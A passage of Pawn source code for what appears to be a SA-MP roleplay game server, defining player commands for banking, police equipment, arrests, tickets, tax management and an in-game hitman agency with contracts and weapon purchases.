		SendAdminMessage(COLOR_ADMWARN, string);
		Log("Log/Players/transfer.log", string);
	}
	else NoLoginB(playerid);
	return 1;
}
IRP:deposit(playerid, var[])
{
	new amount, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerNearBankBooth(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in the bank.");
	if(sscanf(var, "i", amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deposit [amount]");
	if(amount > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
	if(amount <= 0)  return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid amount of money.");
	Player[playerid][pBank] += amount;
	GiveZamoraMoney(playerid, -amount);
	format(string, sizeof(string), " You have deposited $%d into your bank account, your bank balance is now: $%d.", amount, Player[playerid][pBank]);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}
IRP:deploycone(playerid, var[])
{
	new str[128];
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(Player[playerid][pFacRank] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your rank is too low to use this command.");
	new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
 	GetPlayerPos(playerid, plocx, plocy, plocz);
  	GetPlayerFacingAngle(playerid,ploca);
   	CreateCone(plocx-0.8,plocy-0.8,plocz,ploca);
   	format(str, sizeof(str), "** Department Center: %s has deployed a cone at his place.", GetName(playerid));
	SendCopMessage(COLOR_BLUE, str);
    return 1;
}
IRP:destroycone(playerid, var[])
{
	new str[128];
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(Player[playerid][pFacRank] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your rank is too low to use this command.");
	DeleteClosestCone(playerid);
	format(str, sizeof(str), "** Department Center: %s has picked up all cones.", GetName(playerid));
	SendCopMessage(COLOR_BLUE, str);
	return 1;
}
IRP:destroycones(playerid, var[])
{
	new str[128];
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(Player[playerid][pFacRank] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your rank is too low to use this command.");
	format(str, sizeof(str), "** Department Center: %s has picked up all cones.", GetName(playerid));
	SendCopMessage(COLOR_BLUE, str);
 	DeleteAllCone();
 	return 1;
}
IRP:deployspike(playerid, var[])
{
	new string[128], Float:Pos[4];
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!IsACop(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not an LEO.");
   	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(Player[playerid][pFacRank] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your rank is too low to use this command.");
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    GetPlayerFacingAngle(playerid,Pos[3]);
 	CreateStrip(Pos[0], Pos[1], Pos[2],Pos[3]);
 	format(string, sizeof(string), "Department Center: %s has created a spike strip.", GetName(playerid));
 	SendCopMessage(COLOR_BLUE, string);
 	SendFBIMessage(COLOR_FBI, string);
 	SendNGMessage(COLOR_DOC, string);
	return 1;
}

IRP:destroyspike(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!IsACop(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not an LEO.");
	if(Player[playerid][pFacRank] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your rank is too low to use this command.");
	DeleteClosestStrip(playerid);
	format(string, sizeof(string), "Department Center: %s has deleted a spike strip.", GetName(playerid));
	SendCopMessage(COLOR_BLUE, string);
 	SendFBIMessage(COLOR_FBI, string);
 	SendNGMessage(COLOR_DOC, string);
	return 1;
}

IRP:destroyspikes(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!IsACop(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not an LEO.");
	if(Player[playerid][pFacRank] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "Your rank is too low to use this command.");
	DeleteAllStrip();
 	format(string, sizeof(string), "Department Center: %s has removed all spike strips.", GetName(playerid));
 	SendCopMessage(COLOR_BLUE, string);
 	SendFBIMessage(COLOR_FBI, string);
 	SendNGMessage(COLOR_DOC, string);
	return 1;
}


IRP:drag(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_GRAD2, "** [Usage]: /drag [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(playerid == user) return 0;
	if(Drag[playerid] != -1 || Dragged[playerid] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "Error occured, try again after while.");
    if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not near that player.");
	if(IsPlayerInAnyVehicle(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't drag this player as He's inside a vehicle.");
	if(!Cuffed[user] && !Tied[user]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't drag this player as He's not cuffed or tied.");
	if(Dragged[user] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "You can't drag this player as He's already being dragged.");
	Drag[playerid] = user;
	Dragged[user] = playerid;
	format(string, sizeof(string), "* %s pulls %s and starts dragging them.", GetName(playerid), GetName(user));
 	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:stopdrag(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Drag[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command, as you are not dragging someone.");
	user = Drag[playerid];
	Drag[playerid] = -1;
	Dragged[user] = -1;
	format(string, sizeof(string), "* %s released %s and stops dragging them.", GetName(playerid), GetName(user));
 	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}
IRP:stopanim(playerid, var[])
{
    if(Player[playerid][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to do this while you are injured.");
    StopLoopingAnim(playerid);
	TextDrawHideForPlayer(playerid,txtAnimHelper);
	animation[playerid] = 0;
   	ClearAnimations(playerid);
    TextDrawHideForPlayer(playerid,txtAnimHelper);
    SendClientMessage(playerid, COLOR_YELLOW, "** You've successfully stopped your animation.");
    return 1;
}
IRP:hitmansms(playerid, var[])
{
    if(IsAHitman(playerid))
	{
	    new string[128];
		if(!Logged(playerid)) return NoLogin(playerid);
		if(!IsAHitman(playerid) && !Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the director.");
		if(sscanf(var, "s[64]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hitmansms [text]");
		if(AntiAdv(playerid, var)) return 1;
		if(strlen(var) > 64) return SendClientMessage(playerid, COLOR_GRAD2, "You may only use 64 characters per SMS.");
       	foreach(Player, i)
		{
		    if(Logged(i))
		    {
		        format(string, sizeof(string), "SMS: %s, Ph: Blocked", var);
		        SendClientMessage(i, COLOR_YELLOW, string);
		        PlayerPlaySound(i, 5205, 0.0, 0.0, 0.0);
	        }
		}
		format(string, sizeof(string), "[%s]: %s", GetName(playerid), var);
		Log("Log/Players/hitmansms.log", string);
	}
	return 1;
}
IRP:contract(playerid, var[])
{
	new string[128], user, amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "ui", user, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /contract [playerid] [amount]");
	if(amount < 10000 || amount > 10000000) return SendClientMessage(playerid, COLOR_GRAD2, "Contracts are between $10,000 and $10,000,000.");
	if(Player[playerid][pMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much on you at the moment.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(playerid == user) return 0;
	if(Player[user][pLevel] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't contract new players.");
	if(Player[user][pContract] >= 30000000) return SendClientMessage(playerid, COLOR_GRAD2, "That player has the maximum contract amount on his head already.");
	Player[user][pContract] += amount;
	format(Player[user][pContractBy], 32, "%s", GetName(playerid));
	GiveZamoraMoney(playerid, -amount);
	format(string, sizeof(string), "HitmanWarning: %s has placed a contract on %s for $%d.", GetName(playerid), GetName(user), amount);
	SendHitmanMessage(COLOR_YELLOW, string);
	SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Players/contract.log", string);
	return 1;
}

IRP:order(playerid, var[])
{
	if(IsAHitman(playerid))
	{
	   	if(!Logged(playerid)) return NoLogin(playerid);
		if(!IsPlayerInRangeOfPoint(playerid, 2, 2233.4729,-1333.2303,23.9815) && !IsPlayerInRangeOfPoint(playerid, 2, 1628.7523,-1903.4075,13.5532)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the Hitman Agency HQ.");
		if(sscanf(var, "s[32]", var))
		{
			SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /order [item]");
			SendClientMessage(playerid, COLOR_GRAD2, "ITEMS: Knife ($1000) | Shotgun ($2000) | Deagle ($5000) | MP5 ($3000)");
			SendClientMessage(playerid, COLOR_GRAD2, "ITEMS: M4 ($9000) | Spas12 ($13000) | Sniper ($14000) | Scope ($10000)");
		    return 1;
		}
		if(!strcmp(var, "knife", true))
		{
		    if(Player[playerid][pMoney] < 1000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 4, 1);
		    GiveZamoraMoney(playerid, -1000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a Knife.");
		}
		else if(!strcmp(var, "deagle", true))
		{
		    if(Player[playerid][pMoney] < 5000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 24, 500);
		    GiveZamoraMoney(playerid, -5000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a Desert Eagle.");
		}
		else if(!strcmp(var, "shotgun", true))
		{
		    if(Player[playerid][pMoney] < 2000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 25, 500);
		    GiveZamoraMoney(playerid, -2000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a Shotgun.");
		}
		else if(!strcmp(var, "mp5", true))
		{
		    if(Player[playerid][pMoney] < 3000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 29, 500);
		    GiveZamoraMoney(playerid, -3000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a MP5.");
		}
		else if(!strcmp(var, "m4", true))
		{
		    if(Player[playerid][pMoney] < 9000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 31, 500);
		    GiveZamoraMoney(playerid, -9000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased an M4.");
		}
		else if(!strcmp(var, "spas12", true))
		{
		    if(Player[playerid][pMoney] < 13000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 27, 200);
		    GiveZamoraMoney(playerid, -13000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a SPAS12.");
		}
		else if(!strcmp(var, "sniper", true))
		{
		    if(Player[playerid][pMoney] < 14000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		    GiveZamoraWeapon(playerid, 34, 200);
		    GiveZamoraMoney(playerid, -14000);
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a Sniper.");
		}
		else if(!strcmp(var, "scope", true))
		{
	 		if(Player[playerid][pMoney] < 10000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
			GiveZamoraMoney(playerid, -10000);
			Player[playerid][pScope] ++;
		    SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have purchased a Scope.");
		}
	}
	return 1;
}

IRP:profile(playerid, var[])
{
	if(IsAHitman(playerid))
	{
	    new string[128], user, gender[8];
	   	if(!Logged(playerid)) return NoLogin(playerid);
		if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /profile [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(Player[user][pGender] == 1) format(gender, sizeof(gender), "Male");
		else if(Player[user][pGender] == 2) format(gender, sizeof(gender), "Female");
	    SendClientMessage(playerid, COLOR_YELLOW, "[Hitman Agency Profiles Database]:");
	    format(string, sizeof(string), "Name: {FFFFFF}%s", GetName(user));
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    format(string, sizeof(string), "Age: {FFFFFF}%d", Player[user][pAge]);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    format(string, sizeof(string), "Gender: {FFFFFF}%s", gender);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    format(string, sizeof(string), "Faction: {FFFFFF}%s", RPFNEx(user));
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    format(string, sizeof(string), "Rank: {FFFFFF}%s (%d)", RPFRN(user), Player[user][pFacRank]);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    format(string, sizeof(string), "Family: {FFFFFF}%s", RPFaN(user));
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    format(string, sizeof(string), "Rank: {FFFFFF}%s (%d)", RPFaRN(user), Player[user][pFamRank]);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	return 1;
}

IRP:contracts(playerid, var[])
{
	if(IsAHitman(playerid) || Player[playerid][pAdmin] >= 4)
	{
		new string[128];
	   	if(!Logged(playerid)) return NoLogin(playerid);
	    SendClientMessage(playerid, COLOR_YELLOW, "[Hitman Agency Contracts List]:");
	    foreach(Player, i)
	    {
	        if(Logged(i))
	        {
	            if(Player[i][pContract])
	            {
	                format(string, sizeof(string), "%d) %s | Amount: %d | By: %s", i, GetName(i), Player[i][pContract], Player[i][pContractBy]);
	                SendClientMessage(playerid, COLOR_WHITE, string);
	            }
	        }
	    }
	}
	return 1;
}

IRP:hit(playerid, var[])
{
	if(IsAHitman(playerid))
	{
		new string[128];
   		if(!Logged(playerid)) return NoLogin(playerid);
	    if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hit [text]");
	    if(AntiAdv(playerid, var)) return 1;
	    format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
		SendHitmanMessage(COLOR_YELLOW, string);
		Log("Log/Players/hitman.log", string);
	}
	return 1;
}

IRP:givehit(playerid, var[])
{
	if(IsAHitman(playerid))
	{
		new string[128], user, hitman;
   		if(!Logged(playerid)) return NoLogin(playerid);
	    if(sscanf(var, "uu", hitman, user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givehit [hitmanid] [contractid]");
		if(!Player[user][pContract]) return SendClientMessage(playerid, COLOR_GRAD2, "That player doesn't have a head on his head.");
		if(!IsAHitman(hitman)) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not a member of the agency.");
		if(Hitman[hitman] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "Hitman is already assigned to a contract.");
		Hitman[hitman] = user;
		format(string, sizeof(string), "HitmanWarning: %s has assigned %s to the contract on %s's head.", GetName(playerid), GetName(hitman), GetName(user));
		SendHitmanMessage(COLOR_YELLOW, string);
		SendClientMessage(playerid, COLOR_WHITE, "** You can cancel the contract using '/cancel contract)'.");
	}
	return 1;
}

IRP:taxvault(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsAGov(playerid) || !Player[playerid][pFacLeader]) return NoAuth(playerid);
	if(!IsPlayerNearBankBooth(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a bank.");
	format(string, sizeof(string), "[Bank Statement]: The state's tax vault contains $%d.", TaxMoney);
	SendClientMessage(playerid, COLOR_GOV, string);
	return 1;
}

IRP:taxwithdraw(playerid, var[])
{
	new amount, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsAGov(playerid) || !Player[playerid][pFacLeader]) return NoAuth(playerid);
	if(!IsPlayerNearBankBooth(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a bank.");
	if(sscanf(var, "i", amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /taxwithdraw [amount]");
	if(amount > TaxMoney) return SendClientMessage(playerid, COLOR_GRAD2, "The tax vault doesn't have that much money inside it.");
	if(amount <= 0)  return SendClientMessage(playerid, COLOR_GRAD2, "You are writing invalid amount.");
	TaxMoney -= amount;
	GiveZamoraMoney(playerid, amount);
	format(string, sizeof(string), "[Bank Warning]: %s has withdrawn $%d from the tax vault, amount left: $%d.", GetName(playerid), amount, TaxMoney);
	SendGovMessage(COLOR_GOV, string);
	format(string, sizeof(string), "AdminWarning: %s has withdrawn $%d from the tax vault, amount left: $%d.", GetName(playerid), amount, TaxMoney);
	SendAdminMessage(COLOR_ADMWARN,  string);
	Log("Log/Players/taxvault.log", string);
	return 1;
}

IRP:settax(playerid, var[])
{
	new string[128], percent;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsAGov(playerid) || !Player[playerid][pFacLeader]) return NoAuth(playerid);
	if(sscanf(var, "i", percent)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /settax [percent]");
	if(percent < 0 || percent > 100) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering invalid amount.(Starting from 1 to 100.)");
	TempTaxPercent = percent;
	TaxRequester = playerid;
	SendClientMessage(playerid, COLOR_LIGHTBLUE, " Your tax percent change request has been sent to online admins, wait for them to approve/deny.");
	format(string, sizeof(string), "AdminWarning: %s has requested to change the tax percent to %d. (/approve) (/deny)", GetName(playerid), percent);
	SendAdminMessage(COLOR_ADMWARN,  string);
	return 1;
}
IRP:m(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsDOC(playerid) && !IsFBI(playerid) && !IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO/Medic.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/m)egaphone [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(!IsLeoVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GRAD2, "You must be in an LSPD vehicle to use the megaphone.");
    format(string, sizeof(string), "[%s:o< %s]", GetName(playerid), var);
	SendNearbyMessage(playerid, 40, string, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
	return 1;
}


IRP:su(playerid, var[])
{
	new user, string[128], string1[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(sscanf(var, "us[64]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /su [playerid] [charge]");
	if(!Logged(user)) return NoLoginB(playerid);
    if(IsACop(user) && IsDOC(playerid) && IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't charge an LEO.");
	if(Player[user][pWanted] >= 6) return SendClientMessage(playerid, COLOR_GRAD2, "That player has maximum wanted level.");
	AddZamoraWantedLevel(user, var);
	PlayerPlaySound(playerid,1054,0.0,0.0,0.0);
	PlayerPlaySound(user,1054,0.0,0.0,0.0);
	format(string, sizeof(string), " You have commited a Crime ( %s ). Reporter: %s.", var, GetName(playerid));
	SendClientMessage(user, COLOR_LIGHTRED, string);
	format(string1, sizeof(string1), "Department Center: %s has charged %s for '%s'.", GetName(playerid), GetName(user), var);
	SendCopMessage(COLOR_BLUE, string1);
	SendFBIMessage(COLOR_FBI, string1);
	return 1;
}

IRP:ticket(playerid, var[])
{
	new string[128], user, amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(sscanf(var, "uis[32]", user, amount, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ticket [playerid] [amount] [reason]");
    if(!Logged(user)) return NoLoginB(playerid);
	if(amount < 0 || amount > 5000) return SendClientMessage(playerid, COLOR_GRAD2, "Tickets are between $0 and $5000.");
    if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	TicketBy[user] = playerid;
	TicketPrice[playerid][user] = amount;
	format(string, sizeof(string), "* %s takes out a pen and tickets book, writes down a ticket then hands it to %s.", GetName(playerid), GetName(user));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	format(string, sizeof(string), " You have given %s a ticket for $%d, reason: %s", GetName(user), amount, var);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has given you a ticket for $%d, reason: %s", GetName(playerid), amount, var);
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	SendClientMessage(user, COLOR_WHITE, "(/accept ticket) to pay the ticket.");
	return 1;
}

IRP:wanted(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsFBI(playerid) && !IsDOC(playerid) && Player[playerid][pJob] != JOB_LAWYER && Player[playerid][pVIPJob] != JOB_LAWYER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO nor a Lawyer.");
	SendClientMessage(playerid, COLOR_BLUE, "[Wanted List]:");
	foreach(Player, i)
	{
	    if(Player[i][pWanted])
	    {
	        format(string, sizeof(string), "%d) %s | Wanted Level: %d", i, GetName(i), Player[i][pWanted]);
	        SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	}
	return 1;
}

IRP:arrest(playerid, var[])
{
	new user, time, string[128], string1[128], amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsFBI(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 1527.1012,-1677.6177,5.8906)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the arrest point");
	if(sscanf(var, "ui", user, time)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /arrest [playerid] [minutes]");
	if(time < 1 || time > 120) return SendClientMessage(playerid, COLOR_GRAD2, "Jail time can't be below 1 or above 120 minutes - take the person to prison for more time.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!Player[user][pWanted]) return SendClientMessage(playerid, COLOR_GRAD2, "This player is not in the wanted list.");
	if(IsACop(user) && IsFBI(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to arrest LEOs.");
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	format(string, sizeof(string), "Local Jail: %s has been arrested by %s.", GetName(user), GetName(playerid));
	SendCopMessage(COLOR_BLUE, string);
	SendFBIMessage(COLOR_FBI, string);
	if(Player[user][pVIP] >= 2)
	{
        SetPlayerColor(user, TRANSPARENT_WHITE);
    	Player[user][pArrested] ++;
    	Player[user][pJail] = 1;
    	Player[user][pJailTime] = 70*time*60/100;
    	ClearZamoraWantedLevels(user);
    	SetPlayerInterior(user, 0);
    	SetPlayerVirtualWorld(user, 0);
    	TogglePlayerControllable(user, 0);
    	TogglePlayerCuffed(user, 0);
    	SetTimerEx("EnterExitTimer", 5000, false, "i", user);
    	new RandomCell = random(sizeof(RandomJail));
     	SetPlayerFacingAngle(user, RandomJail[RandomCell][3]);
     	SetPlayerPos(user, RandomJail[RandomCell][0], RandomJail[RandomCell][1], RandomJail[RandomCell][2]);
     	SetCameraBehindPlayer(user);
    	format(string, sizeof(string), "You have been arrested for %d minutes", Player[user][pJailTime]/60 * 100 / 30);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
    	format(string1, sizeof(string1), "Your time is decreased 30 percent by the benifit of the VIP");
		SendClientMessage(user, COLOR_VIP, string1);
    	RemovePlayerAttachedObject(user, 0);
    	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
    	if(DeliverMoney[user] == 1)
    	{
	            new Rob = BankRobber[user]-1;
        	    DisablePlayerCheckpoint(user);
         		BankRobbersCount --;
          		format(BankRobbers[Rob], MAX_PLAYER_NAME, "");
        		DeliverMoney[user] = 0;
         		BankRobber[user] = 0;
        		if(BankRobbersCount == 0)
				{
       	    		BankRobbery = 0;
        			RobberyStarted = 0;
        		}
        }
    }
    else
    {
        SetPlayerColor(user, TRANSPARENT_WHITE);
    	Player[user][pArrested] ++;
    	Player[user][pJail] = 1;
    	Player[user][pJailTime] = time*60;
    	ClearZamoraWantedLevels(user);
    	SetPlayerInterior(user, 0);
    	SetPlayerVirtualWorld(user, 0);
    	TogglePlayerControllable(user, 0);
    	TogglePlayerCuffed(user, 0);
    	SetTimerEx("EnterExitTimer", 5000, false, "i", user);
    	new RandomCell = random(sizeof(RandomJail));
     	SetPlayerFacingAngle(user, RandomJail[RandomCell][3]);
     	SetPlayerPos(user, RandomJail[RandomCell][0], RandomJail[RandomCell][1], RandomJail[RandomCell][2]);
     	SetCameraBehindPlayer(user);
    	new idx = Player[playerid][pHouse];
    	new idx2 = Player[playerid][pBiz];
        new TotalWealth = Player[user][pMoney]+Player[user][pBank]+HouseInfo[idx][hMoney]+BizInfo[idx2][bMoney];
    	amount = (5*(TotalWealth))/100;
    	GiveZamoraMoney(user, -amount);
    	format(string1, sizeof(string1), "You have been arrested for %d minutes (%d seconds), and you've been fined $%d", Player[user][pJailTime]/60, Player[user][pJailTime], amount);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string1);
    	RemovePlayerAttachedObject(user, 0);
    	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
    	if(DeliverMoney[user] == 1)
    	{
	            new Rob = BankRobber[user]-1;
        	    DisablePlayerCheckpoint(user);
         		BankRobbersCount --;
          		format(BankRobbers[Rob], MAX_PLAYER_NAME, "");
        		DeliverMoney[user] = 0;
         		BankRobber[user] = 0;
        		if(BankRobbersCount == 0)
				{
       	    		BankRobbery = 0;
        			RobberyStarted = 0;
        		}
        }
    }
	return 1;
}
IRP:deliver(playerid, var[])
{
	new user, time, string[128], string1[128], amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsFBI(playerid) && !IsDOC(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a LEO.");
	if(!Player[playerid][pFacDuty]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command as you are off duty.");
	if(!IsPlayerInRangeOfPoint(playerid, 2, 870.4260,-2341.1616,13.0859)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the deliver point");
	if(sscanf(var, "ui", user, time)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /deliver [playerid] [minutes]");
	if(time < 120 || time > 300)
			return SendClientMessage(playerid, COLOR_GRAD2, "Prison time can't be below 120 or above 600 minutes - take the person to jail for less time.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!Player[user][pWanted]) return SendClientMessage(playerid, COLOR_GRAD2, "This player is not in the wanted list.");
	if(IsACop(user) && IsFBI(user)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to arrest LEOs.");
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	format(string, sizeof(string), "Prison: %s has been deliver to prison by %s.", GetName(user), GetName(playerid));
	SendCopMessage(COLOR_BLUE, string);
	SendFBIMessage(COLOR_FBI, string);
    if(Player[user][pVIP] >= 2)
	{
        SetPlayerColor(user, TRANSPARENT_WHITE);
    	Player[user][pArrested] ++;
    	Player[user][pPrison] = 1;
    	Player[user][pPrisonTime] = 70*time*60/100;
    	ClearZamoraWantedLevels(user);
    	SetPlayerInterior(user, 0);
    	SetPlayerVirtualWorld(user, 0);
    	TogglePlayerControllable(user, 0);
    	TogglePlayerCuffed(user, 0);
    	SetTimerEx("EnterExitTimer", 5000, false, "i", user);
    	new RandomCell = random(sizeof(RandomPrison));
     	SetPlayerFacingAngle(user, RandomPrison[RandomCell][3]);
